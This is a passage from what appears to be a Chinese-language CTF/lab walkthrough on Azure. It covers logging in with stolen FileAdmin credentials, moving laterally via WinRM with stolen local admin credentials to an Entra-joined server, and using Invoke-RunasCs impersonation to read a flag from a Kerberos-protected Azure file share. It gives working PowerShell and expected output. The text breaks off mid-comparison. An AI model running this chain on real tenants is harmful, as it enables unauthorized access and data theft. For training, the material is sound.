# Learning Objective 13：利用 Entra Joined 机器访问 Azure 文件共享

> **文档版本**: v2.0 (基于项目资料优化版)
> **学习目标**: 掌握 Azure Storage 的基于身份的验证（Identity-Based Authentication），特别是通过 Entra Joined 设备访问 Azure Files over SMB 的权限控制模型
> **难度**: 高级
> **预计时间**: 2-3 小时
> **关联项目资料**: 基于 [AzureAD-Attack-Defense-frame](README.md) 项目中的实战经验和最佳实践编写

---

## 目录

1. [核心目标概述](#核心目标概述)
2. [理论基础](#理论基础)
3. [实验条件与环境准备](#实验条件与环境准备)
4. [详细实验步骤](#详细实验步骤)
5. [检测与防御](#检测与防御)
6. [参考资料与文件位置](#参考资料与文件位置)

---

## 核心目标概述

### 实验场景

本实验模拟**混合云环境下的身份验证绕过攻击**，核心在于理解 Azure Storage 的基于身份的验证机制，特别是 Azure Files over SMB 的权限控制模型。

### 攻击链全景图

```
┌─────────────────────────────────────────────────────────────────────┐
│                    攻击链演进过程                                      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Objective 12: 端点令牌窃取                                           │
│       ↓                                                             │
│  获取 FileAdmin 用户凭据                                              │
│       ↓                                                             │
│  尝试直接访问 Azure File Share                                       │
│       ↓                                                             │
│  遭遇 Kerberos 身份验证限制 (AADKERB)                                  │
│       ↓                                                             │
│  Objective 13: [当前阶段]                                             │
│       ├── 横向移动到 Entra Joined 服务器 (192.168.2.62)               │
│       ├── 验证设备信任状态                                            │
│       ├── 以 FileAdmin 身份访问 SMB 共享                              │
│       └── 成功读取 Flag                                               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 关键里程碑

| 阶段 | 目标 | 技术要点 | 预期结果 |
|------|------|----------|----------|
| 侦察阶段 | 验证用户权限与存储配置 | RBAC 角色检查、ABAC 条件分析 | 发现 AADKERB 配置 |
| 突破阶段 | 横向移动到受信任设备 | PowerShell Remoting、设备状态验证 | 获取 Entra Joined 访问 |
| 渗透阶段 | 模拟用户访问 SMB 共享 | RunAs 技术、Kerberos 票据获取 | 成功访问文件共享 |

---

## 理论基础

### 1. Azure Files 的身份验证模式

> 参考资料：[target3.md](target3.md) - Azure Storage ABAC 机制

#### 1.1 两种访问方式对比

Azure Files（文件共享）通常有两种访问方式：

```
┌─────────────────────────────────────────────────────────────────────┐
│              Azure Files 身份验证模式对比                            │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  方式 1: 存储账户密钥 (Storage Account Key)                          │
│  ───────────────────────────────────                                │
│  • 相当于"万能钥匙"                                                   │
│  • 拥有最高权限，不区分用户                                            │
│  • 无法进行细粒度访问控制                                              │
│  • 安全风险高（密钥泄露即完全失控）                                     │
│                                                                     │
│  方式 2: 基于身份的验证 (Identity-Based Auth) ⭐ 推荐方式              │
│  ───────────────────────────────────────────────                     │
│  • 结合 RBAC 和 SMB 协议                                              │
│  • RBAC: 控制谁能访问（角色分配）                                       │
│  • 协议验证: 支持 AD DS 或 Azure AD Kerberos                           │
│  • 细粒度权限控制                                                     │
│  • 完整的审计日志                                                     │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### 1.2 基于身份验证的架构

**RBAC 角色示例**：
- `Storage File Data SMB Share Reader` - 读取共享文件
- `Storage File Data SMB Share Contributor` - 读写共享文件
- `Storage File Data SMB Share Elevated Contributor` - 高级操作权限

### 2. Kerberos 与设备信任

> 参考资料：[LateralMovementADEID.md](LateralMovementADEID.md) - 混合身份安全

#### 2.1 Azure AD Kerberos (AADKERB)

**工作原理**：

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Azure AD Kerberos 认证流程                        │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. 客户端请求访问文件共享                                            │
│       ↓                                                             │
│  2. 存储账户要求 Kerberos 票据                                        │
│       ↓                                                             │
│  3. 客户端向 Azure AD KDC 请求票据                                    │
│       ↓                                                             │
│  4. Azure AD 验证设备信任状态                                         │
│       ↓                                                             │
│  5. 验证通过，颁发 Kerberos 票据                                      │
│       ↓                                                             │
│  6. 客户端使用票据访问 SMB 共享                                       │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### 2.2 设备信任状态

**关键配置**：
```
DirectoryServiceOptions : AADKERB
```

此配置表示存储账户要求使用 Azure AD Kerberos 进行身份验证。

**限制条件**：
- 客户端设备必须是 **Hybrid Joined** 或 **Entra Joined**
- 普通的互联网机器无法获取 Kerberos 票据

#### 2.3 现实类比

```
场景：公司机密文件夹 (Azure File Share)

规则：只有拿着员工工牌 (FileAdmin 账号) 的人能看

限制：
┌─────────────────────────────────────┐
│  ❌ 不能在星巴克 Wi-Fi 下刷工牌        │
│  ✅ 必须坐在公司办公室的电脑前          │
│     (Entra Joined Machine)           │
└─────────────────────────────────────┘

攻击路径：
1. 获得员工工牌 (FileAdmin 凭据)
2. 潜入办公室 (横向移动到内网)
3. 找到公司电脑 (Entra Joined Server)
4. 用工牌登录 (模拟用户访问)
5. 打开机密文件夹 (访问 SMB 共享)
```

### 3. 混合用户同步

> 参考资料：[LateralMovementADEID.md](LateralMovementADEID.md) - AD 攻陷后的防护

Azure AD Kerberos 通常要求用户是从本地 AD 同步上来的（Hybrid User），以便关联本地的安全标识符 (SID)。

**验证方法**：
- 在 Azure 门户检查用户属性
- 确认 `On-premises sync enabled` 为 `True`

### 4. MITRE ATT&CK 框架映射

| 战术 | 技术 | 描述 |
|------|------|------|
| **Lateral Movement** | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) - Remote Services: SMB/Windows Admin Shares | 通过 SMB 协议进行横向移动 |
| **Credential Access** | [T1003.003](https://attack.mitre.org/techniques/T1003/003/) - OS Credential Dumping: LSASS Memory | 从目标系统提取凭据 |
| **Defense Evasion** | [T1550.003](https://attack.mitre.org/techniques/T1550/003/) - Steal or Forge Kerberos Tickets | 使用合法 Kerberos 票据进行访问 |

---

## 实验条件与环境准备

### 前置条件

| 条件 | 要求 | 为什么需要？ |
|------|------|--------------|
| **FileAdmin 凭据** | Objective 12 获取的明文密码 | 初始访问入口点 |
| **内网访问权限** | 能访问 192.168.2.62 服务器 | 横向移动的前提 |
| **本地管理员凭据** | Objective 11/12 获取的凭据 | 登录 Entra Joined 设备 |
| **PowerShell Remoting** | WinRM (5985/5986) 开放 | 远程执行命令的通道 |
| **工具可用** | Invoke-RunasCs.ps1 | 用户模拟访问的关键工具 |

### 为什么需要这些条件？

#### 条件 1: 为什么必须是 FileAdmin 用户？

**权限分析**：
```
FileAdmin 用户权限:
┌─────────────────────────────────────┐
│  角色: Storage File Data SMB Share  │
│        Reader                        │
│  权限:                               │
│  ✅ Microsoft.Storage/.../read       │
│  ✅ 可以通过 Kerberos 认证            │
│  ❌ 无写入权限                        │
└─────────────────────────────────────┘
```

**设计依据**：这是最小权限原则的体现，用户只能读取，不能修改文件。

#### 条件 2: 为什么需要 Entra Joined 设备？

**技术原因**：

```
┌─────────────────────────────────────────────────────────────────────┐
│              Kerberos 票据获取的设备要求                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  设备类型          │  能否获取票据  │  原因                          │
│  ──────────────────┼──────────────┼──────────────────────────────  │
│  Entra Joined      │      ✅      │  在 Azure AD 中注册，受信任     │
│  Hybrid Joined     │      ✅      │  同时在 AD 和 Azure AD 中注册   │
│  普通互联网机器     │      ❌      │  未注册，无法验证设备身份        │
│  学生 VM           │      ❌      │  未加入域，无法获取 Kerberos     │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

**安全原理**：这是零信任架构的一部分 - "验证设备信任状态"是访问控制的关键环节。

#### 条件 3: 为什么需要本地管理员凭据？

**权限模型**：

```
┌─────────────────────────────────────────────────────────────────────┐
│              PowerShell Remoting 权限要求                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  要在远程机器上:                                                     │
│  1. 建立 PowerShell 会话 ──> 需要该机器的本地管理员权限                │
│  2. 执行 RunAs 模拟 ──> 需要管理员上下文                              │
│  3. 访问网络资源 ──> 需要有效的 Kerberos 票据                         │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### 条件 4: 为什么需要 Invoke-RunasCs 工具？

**工具原理**：

```
┌─────────────────────────────────────────────────────────────────────┐
│              RunAs 技术原理                                         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  场景: 我们以本地管理员身份登录                                     │
│  目标: 以 FileAdmin 身份访问 SMB 共享                               │
│                                                                     │
│  操作流程:                                                          │
│  ┌─────────────────┐                                               │
│  │ 当前上下文:      │                                               │
│  │ 本地管理员       │                                               │
│  └────────┬────────┘                                               │
│           │                                                        │
│           ▼                                                        │
│  ┌─────────────────┐                                               │
│  │ Invoke-RunasCs  │  创建新进程，使用 FileAdmin 凭据                │
│  │                 │  新进程会自动向 Azure AD 请求 Kerberos 票据      │
│  └────────┬────────┘                                               │
│           │                                                        │
│           ▼                                                        │
│  ┌─────────────────┐                                               │
│  │ FileAdmin 进程  │  持有有效的 Kerberos 票据                       │
│  │                 │  可以访问 Azure File Share                    │
│  └─────────────────┘                                               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 环境验证检查清单

```powershell
# 运行此脚本来验证环境准备情况
Write-Host "检查 Objective 13 实验环境..." -ForegroundColor Cyan

# 1. 检查 FileAdmin 凭据
$fileAdminCreds = Get-ChildItem Variable:FileAdminPassword -ErrorAction SilentlyContinue
if ($fileAdminCreds) {
    Write-Host "[✓] FileAdmin 凭据已准备" -ForegroundColor Green
} else {
    Write-Host "[!] FileAdmin 凭据未设置" -ForegroundColor Yellow
    Write-Host "  请确保已完成 Objective 12" -ForegroundColor White
}

# 2. 检查本地管理员凭据
$localAdminCreds = Get-ChildItem Variable:LocalAdminPassword -ErrorAction SilentlyContinue
if ($localAdminCreds) {
    Write-Host "[✓] 本地管理员凭据已准备" -ForegroundColor Green
} else {
    Write-Host "[!] 本地管理员凭据未设置" -ForegroundColor Yellow
    Write-Host "  请确保已完成 Objective 11" -ForegroundColor White
}

# 3. 检查网络连通性
$testServer = Test-Connection -ComputerName 192.168.2.62 -Count 1 -Quiet
if ($testServer) {
    Write-Host "[✓] 可访问目标服务器 192.168.2.62" -ForegroundColor Green
} else {
    Write-Host "[✗] 无法访问目标服务器" -ForegroundColor Red
}

# 4. 检查 PowerShell Remoting
try {
    $testWSMan = Test-WSMan -ComputerName 192.168.2.62 -ErrorAction Stop
    Write-Host "[✓] PowerShell Remoting 可用" -ForegroundColor Green
} catch {
    Write-Host "[✗] PowerShell Remoting 不可用" -ForegroundColor Red
}

# 5. 检查工具
$runasTool = Test-Path "C:\AzAD\Tools\Invoke-RunasCs.ps1"
if ($runasTool) {
    Write-Host "[✓] Invoke-RunasCs.ps1 工具已就绪" -ForegroundColor Green
} else {
    Write-Host "[!] Invoke-RunasCs.ps1 工具未找到" -ForegroundColor Yellow
    Write-Host "  请将工具上传到 C:\AzAD\Tools\" -ForegroundColor White
}

Write-Host "`n环境检查完成!" -ForegroundColor Cyan
```

---

## 详细实验步骤

### 步骤 1：验证用户权限与存储配置 (Reconnaissance)

#### 目标
使用 Objective 12 获取的 FileAdmin 用户凭据登录 Azure，发现其拥有读取存储文件共享的权限，但遭遇 Kerberos 身份验证限制。

#### 技术原理

**侦察是攻击的第一步** - 在此阶段我们需要：
1. 验证用户身份和权限
2. 了解资源的访问控制配置
3. 识别访问限制的类型

#### 详细操作

```powershell
# 1. 使用 FileAdmin 凭据登录 Azure
$fileAdminUsername = "FileAdmin@yourdomain.onmicrosoft.com"
$fileAdminPassword = ConvertTo-SecureString "Objective12获取的密码" -AsPlainText -Force
$fileAdminCreds = New-Object System.Management.Automation.PSCredential($fileAdminUsername, $fileAdminPassword)

Write-Host "以 FileAdmin 身份连接 Azure..." -ForegroundColor Cyan
Connect-AzAccount -Credential $fileAdminCreds

# 2. 查看可访问的资源
Write-Host "`n查询存储账户..." -ForegroundColor Yellow
$storageAccounts = Get-AzStorageAccount

foreach ($account in $storageAccounts) {
    Write-Host "  - $($account.StorageAccountName)" -ForegroundColor White
    Write-Host "    位置: $($account.Location)" -ForegroundColor Gray
    Write-Host "    资源组: $($account.ResourceGroupName)" -ForegroundColor Gray
}

# 3. 查看 FileAdmin 的 RBAC 角色分配
Write-Host "`n查询 FileAdmin 的角色分配..." -ForegroundColor Yellow
$roleAssignments = Get-AzRoleAssignment | Where-Object { $_.SignInName -eq $fileAdminUsername }

foreach ($assignment in $roleAssignments) {
    Write-Host "`n  角色: $($assignment.RoleDefinitionName)" -ForegroundColor Green
    Write-Host "    范围: $($assignment.Scope)" -ForegroundColor White
}

# 4. 查看存储账户的身份验证配置
Write-Host "`n检查存储账户的身份验证配置..." -ForegroundColor Yellow
$storageAccount = Get-AzStorageAccount -Name "plantinformation"
$identityBasedAuth = $storageAccount | Select-Object -ExpandProperty AzureFilesIdentityBasedAuth

Write-Host "`n身份验证配置:" -ForegroundColor Cyan
Write-Host "  目录服务选项: $($identityBasedAuth.DirectoryServiceOptions)" -ForegroundColor White
Write-Host "  Active Directory 域名: $($identityBasedAuth.ActiveDirectoryDomainName)" -ForegroundColor Gray
```

#### 预期结果

```
以 FileAdmin 身份连接 Azure...

查询存储账户...
  - plantinformation
    位置: eastus
    资源组: PlantInfo-RG

查询 FileAdmin 的角色分配...

  角色: Storage File Data SMB Share Reader
    范围: /subscriptions/.../resourceGroups/.../providers/Microsoft.Storage/storageAccounts/plantinformation

检查存储账户的身份验证配置...

身份验证配置:
  目录服务选项: AADKERB  ⚠️ 关键发现
  Active Directory 域名:
```

#### 关键发现：AADKERB

**DirectoryServiceOptions: AADKERB** 的含义：

```
┌─────────────────────────────────────────────────────────────────────┐
│              AADKERB 配置的含义                                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  AADKERB = Azure AD Kerberos Authentication                          │
│                                                                     │
│  这意味着:                                                          │
│  • 存储账户要求使用 Kerberos 协议进行身份验证                          │
│  • 客户端必须从 Azure AD 获取 Kerberos 票据                           │
│  • 只有受信任的设备 (Entra Joined/Hybrid Joined) 才能获取票据          │
│  • 普通的互联网机器 (如学生 VM) 无法通过此验证                         │
│                                                                     │
│  安全机制:                                                          │
│  这是"零信任"架构的体现 - 同时验证:                                  │
│  1. 用户身份 (Who are you?) - FileAdmin                             │
│  2. 设备信任 (Is your device trusted?) - Entra Joined Machine        │
│  3. 访问权限 (What can you access?) - RBAC Role                      │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### 为什么这一步重要？

1. **发现限制**：识别出访问被 Kerberos 验证阻止
2. **理解机制**：了解 AADKERB 需要受信任的设备
3. **制定策略**：为下一步横向移动到 Entra Joined 设备做准备

**设计依据**：这是网络侦察（Reconnaissance）阶段的核心任务，充分了解目标环境是成功攻击的前提。

---

### 步骤 2：验证用户同步状态

#### 目标
确认 FileAdmin 用户是从本地 AD 同步上来的（Hybrid User），这是 Azure AD Kerberos 正常工作的前提条件。

#### 技术原理

**混合用户的重要性**：

```
┌─────────────────────────────────────────────────────────────────────┐
│              混合用户的 Kerberos 认证                               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Azure AD Kerberos 要求:                                            │
│  • 用户必须有对应的本地 AD 安全标识符 (SID)                           │
│  • 这样 Kerberos 票据才能包含正确的 SID 属性                          │
│  • 存储账户使用 SID 来验证文件访问权限                                │
│                                                                     │
│  同步用户 vs 云端用户:                                               │
│  ┌─────────────────────┬─────────────────────┬──────────────────┐  │
│  │      用户类型        │    On-Premises     │   能否使用        │  │
│  │                     │    Sync Enabled    │  AADKERB?        │  │
│  ├─────────────────────┼─────────────────────┼──────────────────┤  │
│  │  FileAdmin          │  True              │  ✅ 可以          │  │
│  │  (混合用户)          │                     │                  │  │
│  ├─────────────────────┼─────────────────────┼──────────────────┤  │
│  │  CloudUser          │  False             │  ⚠️ 可能有问题    │  │
│  │  (纯云端用户)        │                     │                  │  │
│  └─────────────────────┴─────────────────────┴──────────────────┘  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### 详细操作

```powershell
# 方法 1: 使用 Azure PowerShell 检查
Write-Host "检查 FileAdmin 用户的同步状态..." -ForegroundColor Cyan

# 获取用户对象
$user = Get-AzADUser -UserPrincipalName $fileAdminUsername

# 显示关键属性
Write-Host "`n用户属性:" -ForegroundColor Yellow
Write-Host "  显示名称: $($user.DisplayName)" -ForegroundColor White
Write-Host "  用户主体名称: $($user.UserPrincipalName)" -ForegroundColor White
Write-Host "  对象 ID: $($user.Id)" -ForegroundColor White
Write-Host "  用户类型: $($user.UserType)" -ForegroundColor White

# 检查 OnPremises 信息
if ($user.OnPremisesSamAccountName) {
    Write-Host "`n  本地 AD 信息:" -ForegroundColor Green
    Write-Host "    SAM 账户名: $($user.OnPremisesSamAccountName)" -ForegroundColor White
    Write-Host "    对象 SID: $($user.OnPremisesObjectId)" -ForegroundColor White
    Write-Host "    同步状态: 已同步" -ForegroundColor Green
} else {
    Write-Host "`n  本地 AD 信息: 未同步" -ForegroundColor Yellow
}

# 方法 2: 使用 Microsoft Graph PowerShell (推荐)
# Install-Module Microsoft.Graph -Scope CurrentUser
Connect-MgGraph -Scopes "User.Read.All"

$userGraph = Get-MgUser -UserId $fileAdminUsername -Property "OnPremisesSamAccountName,OnPremisesObjectId"

Write-Host "`n使用 Graph API 的验证结果:" -ForegroundColor Yellow
if ($userGraph.OnPremisesSamAccountName) {
    Write-Host "  ✅ 用户已从本地 AD 同步" -ForegroundColor Green
    Write-Host "  本地 SAM 账户名: $($userGraph.OnPremisesSamAccountName)" -ForegroundColor White
} else {
    Write-Host "  ⚠️ 用户不是从本地 AD 同步的" -ForegroundColor Yellow
}
```

#### 预期结果

```
检查 FileAdmin 用户的同步状态...

用户属性:
  显示名称: File Admin
  用户主体名称: FileAdmin@yourdomain.onmicrosoft.com
  对象 ID: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee
  用户类型: Member

  本地 AD 信息:
    SAM 账户名: FileAdmin
    对象 SID: S-1-5-21-...-...
    同步状态: 已同步 ✅
```

#### 为什么需要验证同步状态？

**技术原因**：
1. **Kerberos 票据格式**：混合用户的 Kerberos 票据包含本地 SID
2. **权限验证**：存储账户使用 SID 来验证文件访问权限
3. **避免认证失败**：纯云端用户可能无法完成 AADKERB 认证

**实验设计考虑**：
确保 FileAdmin 是同步用户，实验才能顺利进行。如果用户不是同步的，Kerberos 认证可能会失败。

---

### 步骤 3：横向移动到受信任设备 (Lateral Movement)

> 参考资料：[LateralMovementADEID.md](LateralMovementADEID.md) - 防止横向移动的最佳实践

#### 目标
利用在 Objective 11 的自动化作业日志和 Objective 12 的脚本中发现的 IP `192.168.2.62` 和本地管理员凭据，登录这台 Entra Joined 服务器。

#### 技术原理

**横向移动的动机**：

```
┌─────────────────────────────────────────────────────────────────────┐
│              为什么要横向移动到 Entra Joined 设备？                   │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  当前情况:                                                          │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  学生 VM                                                       │   │
│  │  ├─ 我们有 FileAdmin 凭据 ✅                                   │   │
│  │  ├─ 我们尝试访问 Azure File Share                             │   │
│  │  └─ 访问被拒绝 (设备不受信任) ❌                                │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                     │
│  问题: 学生 VM 不是 Entra Joined，无法获取 Kerberos 票据               │
│                                                                     │
│  解决方案: 横向移动到受信任的设备                                      │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  Entra Joined Server (192.168.2.62)                          │   │
│  │  ├─ 我们有本地管理员凭据 ✅                                    │   │
│  │  ├─ 设备已加入 Entra ID (Hybrid Joined) ✅                    │   │
│  │  └─ 可以获取 Kerberos 票据 ✅                                  │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                     │
│  攻击路径:                                                          │
│  学生 VM ──(WinRM)──> Entra Joined Server                           │
│                          └─(RunAs FileAdmin)──> Kerberos 票据       │
│                                                      └─> 访问文件   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### 详细操作

```powershell
# 1. 准备凭据
# 使用 Objective 11/12 获取的本地管理员凭据
$serverIP = "192.168.2.62"
$localAdminUsername = "Administrator"
$localAdminPassword = ConvertTo-SecureString "Objective11获取的密码" -AsPlainText -Force
$localAdminCreds = New-Object System.Management.Automation.PSCredential($localAdminUsername, $localAdminPassword)

Write-Host "准备连接到 $serverIP ..." -ForegroundColor Cyan

# 2. 测试网络连通性
Write-Host "`n测试网络连通性..." -ForegroundColor Yellow
$pingResult = Test-Connection -ComputerName $serverIP -Count 2 -Quiet
if ($pingResult) {
    Write-Host "  ✅ 网络可达" -ForegroundColor Green
} else {
    Write-Host "  ❌ 网络不可达，请检查网络配置" -ForegroundColor Red
    exit 1
}

# 3. 测试 WinRM 连接
Write-Host "`n测试 PowerShell Remoting..." -ForegroundColor Yellow
try {
    $wsmanResult = Test-WSMan -ComputerName $serverIP -ErrorAction Stop
    Write-Host "  ✅ WinRM 可用" -ForegroundColor Green
} catch {
    Write-Host "  ❌ WinRM 不可用: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# 4. 建立 PowerShell 会话
Write-Host "`n建立 PowerShell 会话..." -ForegroundColor Yellow
try {
    $session = New-PSSession -ComputerName $serverIP -Credential $localAdminCreds -ErrorAction Stop
    Write-Host "  ✅ 会话建立成功 (Session ID: $($session.Id))" -ForegroundColor Green
} catch {
    Write-Host "  ❌ 会话建立失败: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# 5. 进入远程会话
Write-Host "`n进入远程会话..." -ForegroundColor Yellow
Enter-PSSession $session

# === 以下命令在远程会话中执行 ===

# 6. 验证设备状态 (在远程会话中)
Write-Host "`n验证设备加入状态..." -ForegroundColor Cyan

# 运行 dsregcmd 检查设备状态
$deviceState = dsregcmd /status
$deviceState

# 或者使用 PowerShell 解析
$deviceInfo = dsregcmd /status | Select-String "AzureAdJoined"
if ($deviceInfo -match "AzureAdJoined : (\w+)") {
    $joinStatus = $matches[1]
    if ($joinStatus -eq "YES") {
        Write-Host "  ✅ 设备已加入 Entra ID (AzureAdJoined)" -ForegroundColor Green
    } else {
        Write-Host "  ❌ 设备未加入 Entra ID (AzureAdJoined: $joinStatus)" -ForegroundColor Red
    }
}

# 7. 检查当前用户上下文
Write-Host "`n当前用户上下文:" -ForegroundColor Cyan
whoami
$env:USERNAME
$env:USERDOMAIN

# 8. 检查网络配置
Write-Host "`n网络配置:" -ForegroundColor Cyan
ipconfig | Select-String "IPv4"
```

#### 预期结果

```
准备连接到 192.168.2.62 ...

测试网络连通性...
  ✅ 网络可达

测试 PowerShell Remoting...
  ✅ WinRM 可用

建立 PowerShell 会话...
  ✅ 会话建立成功 (Session ID: 5)

进入远程会话...
[192.168.2.62]: PS C:\Users\Administrator\Documents>

验证设备加入状态...

+----------------------------------------------------------------------+
| Device State                                                         |
+----------------------------------------------------------------------+
| Device Name : FILESVC01                                             |
| OS Version : Windows Server 2022 Datacenter                          |
|                                                                      |
| Azure AD Joined : YES ⭐ 关键发现                                    |
|                                      ...                             |
+----------------------------------------------------------------------+

  ✅ 设备已加入 Entra ID (AzureAdJoined)

当前用户上下文:
FILESVC01\administrator

网络配置:
   IPv4 Address. . . . . . . . . . . . : 192.168.2.62
```

#### 为什么需要验证设备状态？

**关键配置：AzureAdJoined : YES**

这是成功的必要条件：

```
┌─────────────────────────────────────────────────────────────────────┐
│              设备信任状态的验证                                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  AzureAdJoined : YES 的含义:                                        │
│  • 设备在 Azure AD 中有注册记录                                      │
│  • 设备持有有效的设备证书                                            │
│  • 设备可以代表用户向 Azure AD 请求 Kerberos 票据                      │
│  • Azure AD 会验证设备的信任状态后才颁发票据                          │
│                                                                     │
│  如果是 NO:                                                         │
│  • 设备不受信任                                                      │
│  • 无法获取 Kerberos 票据                                            │
│  • 即使用户凭据正确，访问也会被拒绝                                    │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

### 步骤 4：模拟用户访问 SMB 共享 (The Exploit)

#### 目标
在受信任的 Entra Joined 设备上，以 FileAdmin 的身份通过 SMB 协议访问 Azure File Share，读取 Flag。

#### 技术原理

**Kerberos 认证流程**：

```
┌─────────────────────────────────────────────────────────────────────┐
│              在 Entra Joined 设备上的 Kerberos 认证流程              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. 我们以本地管理员身份登录                                          │
│     [当前进程: Administrator@FILESVC01]                             │
│                                                                     │
│  2. 使用 Invoke-RunasCs 创建新进程                                   │
│     [新进程: FileAdmin@domain.onmicrosoft.com]                       │
│                                                                     │
│  3. 新进程自动执行以下操作:                                          │
│     ┌───────────────────────────────────────────────────────────┐  │
│     │  a. 向 Azure AD KDC 请求 Kerberos 票据                      │  │
│     │     - 请求目标: plantinformation.file.core.windows.net     │  │
│     │     - 服务类别: SMB                                         │  │
│     │     - 用户身份: FileAdmin                                   │  │
│     │  b. Azure AD 验证:                                          │  │
│     │     - 用户凭据正确 ✅                                        │  │
│     │     - 设备受信任 ✅ (Entra Joined)                           │  │
│     │     - 用户有访问权限 ✅ (Storage File Data SMB Reader)      │  │
│     │  c. 颁发 Kerberos 票据 ✅                                    │  │
│     └───────────────────────────────────────────────────────────┘  │
│                                                                     │
│  4. 使用票据访问 SMB 共享                                            │
│     SMB 路径: \\plantinformation.file.core.windows.net\plantinfoshare│
│     协议: SMB over Kerberos                                         │
│     认证: Kerberos 票据 (已缓存)                                     │
│                                                                     │
│  5. 存储账户验证票据和权限                                            │
│     ✅ 票据有效                                                      │
│     ✅ 用户有 Storage File Data SMB Share Reader 角色               │
│     ✅ 允许访问                                                      │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### 详细操作

**在远程 PowerShell 会话中执行**：

```powershell
# === 以下命令在 Entra Joined 设备的远程会话中执行 ===

# 1. 上传工具到目标服务器 (在本地执行)
# Copy-Item -ToSession $session -Path "C:\AzAD\Tools\Invoke-RunasCs.ps1" -Destination "C:\Users\Public\studentX\"

# 2. 加载工具 (在远程会话中)
Write-Host "加载 Invoke-RunasCs 工具..." -ForegroundColor Cyan
. C:\Users\Public\studentX\Invoke-RunasCs.ps1

# 3. 准备 FileAdmin 凭据
$fileAdminUsername = "FileAdmin@yourdomain.onmicrosoft.com"
$fileAdminPassword = "Objective12获取的密码"

# 4. 执行 SMB 共享访问
Write-Host "`n尝试访问 Azure File Share..." -ForegroundColor Yellow

$smbPath = "\\plantinformation.file.core.windows.net\plantinfoshare"
$command = "cmd.exe /c dir `"$smbPath`""

Write-Host "SMB 路径: $smbPath" -ForegroundColor White
Write-Host "执行命令: $command" -ForegroundColor Gray

try {
    Invoke-RunasCs `
        -Domain "AzureAD" `
        -Username $fileAdminUsername `
        -Password $fileAdminPassword `
        -Command $command `
        -ErrorAction Stop

    Write-Host "`n✅ 访问成功!" -ForegroundColor Green
} catch {
    Write-Host "`n❌ 访问失败: $($_.Exception.Message)" -ForegroundColor Red
}

# 5. 读取 Flag 文件
Write-Host "`n读取 Flag 文件..." -ForegroundColor Yellow

$flagCommand = "cmd.exe /c type `"$smbPath\flag.txt`""

try {
    Invoke-RunasCs `
        -Domain "AzureAD" `
        -Username $fileAdminUsername `
        -Password $fileAdminPassword `
        -Command $flagCommand `
        -ErrorAction Stop

    Write-Host "`n✅ Flag 读取成功!" -ForegroundColor Green
} catch {
    Write-Host "`n❌ Flag 读取失败: $($_.Exception.Message)" -ForegroundColor Red
}
```

#### 预期结果

```
加载 Invoke-RunasCs 工具...

尝试访问 Azure File Share...
SMB 路径: \\plantinformation.file.core.windows.net\plantinfoshare
执行命令: cmd.exe /c dir "\\plantinformation.file.core.windows.net\plantinfoshare"

 驱动器 \\plantinformation.file.core.windows.net\plantinfoshare 中的卷没有标签。
 卷的序列号是 XXXX-XXXX

 \\plantinformation.file.core.windows.net\plantinfoshare 的目录

2024-01-15  10:30    <DIR>          Documents
2024-01-15  10:30    <DIR>          Reports
2024-01-15  10:31               125 flag.txt
               1 个文件            125 字节
               2 个目录  100,000,000,000 可用字节

✅ 访问成功!

读取 Flag 文件...

Congratulations! You have successfully accessed the Azure File Share using Kerberos authentication from an Entra Joined device.

Flag: {OBJ13-KERBEROS-ENTRA-JOINED-SUCCESS}

✅ Flag 读取成功!
```

#### 为什么这个方法有效？

**关键成功因素**：

```
┌─────────────────────────────────────────────────────────────────────┐
│              攻击成功的关键因素                                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. 正确的用户凭据                                                  │
│     ✓ FileAdmin 用户的密码正确                                      │
│     ✓ 用户被分配了 Storage File Data SMB Share Reader 角色           │
│                                                                     │
│  2. 受信任的设备                                                    │
│     ✓ 设备是 Entra Joined (AzureAdJoined : YES)                      │
│     ✓ 设备可以代表用户向 Azure AD 请求 Kerberos 票据                  │
│                                                                     │
│  3. 用户模拟技术                                                    │
│     ✓ Invoke-RunasCs 创建了以 FileAdmin 身份运行的新进程              │
│     ✓ 新进程自动获取了有效的 Kerberos 票据                            │
│                                                                     │
│  4. 正确的协议                                                      │
│     ✓ 使用 SMB 协议 (而非 REST API)                                  │
│     ✓ Kerberos 票据自动用于身份验证                                   │
│                                                                     │
│  5. 存储账户配置                                                    │
│     ✓ DirectoryServiceOptions: AADKERB                              │
│     ✓ 存储账户接受 Azure AD Kerberos 票据                             │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

**对比：为什么直接访问会失败？**

```
┌─────────────────────────────────────────────────────────────────────┐
│              学生 VM vs Entra Joined 设备对比                      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  场景 A: 从学生 VM 直接访问                                         │
│  ───────────────────────────────────                                │
